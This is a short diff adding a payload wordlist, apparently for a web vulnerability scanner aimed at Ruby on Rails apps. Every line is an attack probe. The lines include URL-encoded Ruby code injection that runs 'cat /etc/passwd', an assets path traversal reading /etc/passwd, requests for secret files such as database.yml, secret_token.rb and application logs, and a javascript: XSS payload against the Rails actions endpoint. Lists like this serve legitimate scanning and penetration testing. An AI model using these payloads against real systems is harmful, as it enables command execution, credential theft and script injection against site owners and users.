@@ -1,0 +1,15 @@
+?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+/assets/file:%2f%2f/etc/passwd
+/?pp=env
+/config/database.yml
+/log/development.log
+/logs/development.log
+/development.log
+/log/production.log
+/logs/production.log
+/production.log
+/Rakefile
+/{{randstr}}
+/1238a92f573a48e58d356c42ca2c9610
+/config/initializers/secret_token.rb
+/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=%0djavascript:alert(1)//%0aaaaaa
